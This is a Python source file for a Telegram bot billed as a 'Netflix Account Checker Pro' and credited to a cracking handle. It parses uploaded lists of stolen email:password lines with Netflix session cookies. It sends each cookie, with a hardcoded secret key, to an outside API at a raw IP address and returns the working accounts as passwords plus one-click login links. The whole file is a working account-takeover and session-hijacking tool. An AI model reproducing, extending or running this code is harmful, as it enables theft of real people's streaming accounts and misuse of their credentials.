import logging
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import os
import time
from collections import defaultdict
import asyncio
import re

# Configuration from environment variables
TOKEN = os.getenv('BOT_TOKEN')
API_URL = "http://104.223.121.139:6969/api/gen"
SECRET_KEY = "IpYDCxU9VAxqi88ByaVscqTNDJPg7Cg5"
YOUR_CREDIT = "@CrackByLIM"

if not TOKEN:
    print("❌ ERROR: BOT_TOKEN not set in environment variables!")
    exit(1)

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Stats tracking
total_checks = 0
valid_accounts = 0

# ==================== API FUNCTIONS ====================

async def check_netflix_id(netflix_id, email):
    """Check if Netflix ID is valid by calling the API"""
    try:
        data = {
            "netflix_id": netflix_id,
            "secret_key": SECRET_KEY
        }
        
        logger.info(f"Checking Netflix ID for {email}")
        
        response = requests.post(API_URL, json=data, timeout=10)
        
        try:
            result = response.json()
        except:
            return {
                "success": False, 
                "error": "Invalid JSON response from API",
                "email": email
            }
        
        if result.get('success') == True:
            return {
                "success": True,
                "login_url": result.get('login_url'),
                "email": email,
                "data": result
            }
        else:
            error_code = result.get('error_code', 'UNKNOWN_ERROR')
            error_msg = result.get('error', 'Unknown error')
            
            if error_code == 'INVALID_NETFLIX_ID':
                error_msg = "Netflix ID is invalid or expired"
            elif error_code == 'INVALID_SECRET_KEY':
                error_msg = "Invalid secret key"
                
            return {
                "success": False,
                "error": error_msg,
                "error_code": error_code,
                "email": email
            }
                
    except Exception as e:
        return {
            "success": False, 
            "error": str(e),
            "email": email
        }

# ==================== FILE PARSING ====================

def parse_account_line(line):
    """Parse a single line from the accounts file"""
    try:
        line = line.strip()
        if not line or line.startswith('#'):
            return None
        
        account = {}
        
        # Extract email:password
        email_pass_match = re.match(r'^([^:]+):([^\s|]+)', line)
        if email_pass_match:
            account['email'] = email_pass_match.group(1).strip()
            account['password'] = email_pass_match.group(2).strip()
        else:
            return None
        
        # Extract Netflix Cookies
        cookie_match = re.search(r'NetflixCookies\s*=\s*(NetflixId=[^\s|]+)', line)
        if cookie_match:
            cookie_value = cookie_match.group(1).strip()
            netflix_id_match = re.search(r'NetflixId=([^&\s]+)', cookie_value)
            if netflix_id_match:
                account['netflix_id'] = netflix_id_match.group(1).strip()
        
        # Extract other fields
        fields = {
            'country': r'Country\s*=\s*([^|\n]+)',
            'plan': r'Plan\s*=\s*([^|\n]+)',
            'video_quality': r'VideoQuality\s*=\s*([^|\n]+)',
            'max_streams': r'MaxStreams\s*=\s*([^|\n]+)',
        }
        
        for key, pattern in fields.items():
            match = re.search(pattern, line)
            if match:
                account[key] = match.group(1).strip()
        
        return account
    except Exception as e:
        logger.error(f"Error parsing line: {e}")
        return None

# ==================== BOT COMMANDS ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command"""
    user = update.effective_user
    
    welcome = f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎬 **NETFLIX ACCOUNT CHECKER PRO** 🎬
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

👋 **Welcome, {user.first_name}!**

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📤 **Send a .txt file** with Netflix accounts
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📋 **Required Format:**
`email:password | NetflixCookies = NetflixId=...`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 **Commands:**
/help - Instructions
/stats - Statistics

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    
    await update.message.reply_text(welcome, parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Help command"""
    help_text = f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🆘 **HELP & INSTRUCTIONS** 🆘
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📁 **STEP 1: PREPARE FILE**
• Create a `.txt` file
• One account per line

📝 **EXAMPLE:**
`user@email.com:pass123 | NetflixCookies = NetflixId=v%3D3%26ct%3D...`

⚙️ **STEP 2: UPLOAD**
• Send the file to this chat

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    await update.message.reply_text(help_text, parse_mode='Markdown')

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show statistics"""
    global total_checks, valid_accounts
    
    success_rate = valid_accounts/total_checks*100 if total_checks > 0 else 0
    
    stats_text = f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 **STATISTICS** 📊
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📈 **Performance:**
• **Total Checks:** `{total_checks}`
• **✅ Valid Found:** `{valid_accounts}`
• **📊 Success Rate:** `{success_rate:.1f}%`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    
    await update.message.reply_text(stats_text, parse_mode='Markdown')

# ==================== FILE HANDLER ====================

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle uploaded .txt files"""
    global total_checks, valid_accounts
    
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please upload a `.txt` file.")
        return
    
    status_msg = await update.message.reply_text("🔄 Processing your file... Please wait.")
    
    try:
        # Download file
        file = await context.bot.get_file(document.file_id)
        file_content = await file.download_as_bytearray()
        content = file_content.decode('utf-8', errors='ignore')
        
        # Split into lines
        lines = content.split('\n')
        valid_lines = [l for l in lines if l.strip() and not l.startswith('#')]
        
        if len(valid_lines) == 0:
            await status_msg.edit_text("❌ No valid account lines found in the file.")
            return
        
        await status_msg.edit_text(f"📊 Found {len(valid_lines)} accounts. Processing...")
        
        # Process accounts
        valid_count = 0
        invalid_count = 0
        valid_accounts_found = []
        
        for i, line in enumerate(valid_lines, 1):
            # Parse account
            account = parse_account_line(line)
            if not account or 'netflix_id' not in account:
                invalid_count += 1
                continue
            
            # Update progress
            if i % 5 == 0 or i == len(valid_lines):
                await status_msg.edit_text(f"🔄 Processing: {i}/{len(valid_lines)} accounts...\n✅ Valid: {valid_count}\n❌ Invalid: {invalid_count}")
            
            # Check with API
            email = account.get('email', 'Unknown')
            result = await check_netflix_id(account['netflix_id'], email)
            
            total_checks += 1
            
            if result.get('success'):
                valid_count += 1
                valid_accounts += 1
                valid_accounts_found.append({
                    'email': email,
                    'password': account.get('password', 'N/A'),
                    'login_url': result['login_url'],
                    'country': account.get('country', 'N/A'),
                    'plan': account.get('plan', 'N/A'),
                    'quality': account.get('video_quality', 'N/A'),
                    'streams': account.get('max_streams', 'N/A')
                })
            
            await asyncio.sleep(0.3)  # Rate limiting
        
        # Completion message
        await status_msg.edit_text(f"✅ Processing complete!\n✅ Valid: {valid_count}\n❌ Invalid: {invalid_count}\n📊 Success Rate: {valid_count/len(valid_lines)*100:.1f}%")
        
        # Send valid accounts
        if valid_accounts_found:
            for acc in valid_accounts_found:
                account_msg = f"""
✅ **VALID ACCOUNT FOUND!**

📧 **Email:** `{acc['email']}`
🔑 **Password:** `{acc['password']}`

🌍 **Country:** {acc['country']}
📺 **Plan:** {acc['plan']}
🎬 **Quality:** {acc['quality']}
📱 **Max Streams:** {acc['streams']}

🔗 **Login Link:** `{acc['login_url']}`

⚠️ *Link expires quickly - use it now!*
                """
                
                keyboard = [[InlineKeyboardButton("🎬 LAUNCH NETFLIX", url=acc['login_url'])]]
                
                await update.message.reply_text(
                    account_msg,
                    reply_markup=InlineKeyboardMarkup(keyboard),
                    parse_mode='Markdown'
                )
                await asyncio.sleep(0.5)
            
            await update.message.reply_text(f"✅ Successfully sent {len(valid_accounts_found)} valid account(s)!")
        else:
            await update.message.reply_text("❌ No valid accounts found in your file.")
        
    except Exception as e:
        logger.error(f"Error processing file: {e}")
        await status_msg.edit_text(f"❌ Error processing file: {str(e)[:100]}")

# ==================== MAIN FUNCTION ====================

async def main():
    """Start the bot"""
    print("=" * 60)
    print("🎬 NETFLIX ACCOUNT CHECKER BOT")
    print("=" * 60)
    print(f"✅ Bot Token: {TOKEN[:10]}...")
    print(f"✅ API URL: {API_URL}")
    print("=" * 60)
    
    # Create application
    application = Application.builder().token(TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_file))
    
    # Start the bot
    print("🤖 Bot is starting...")
    await application.initialize()
    await application.start()
    
    # Start polling
    await application.updater.start_polling()
    
    print("✅ Bot is running and ready!")
    print("=" * 60)
    
    # Keep the bot running
    await asyncio.Event().wait()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n👋 Bot stopped")
    except Exception as e:
        print(f"❌ Error: {e}")
        exit(1)
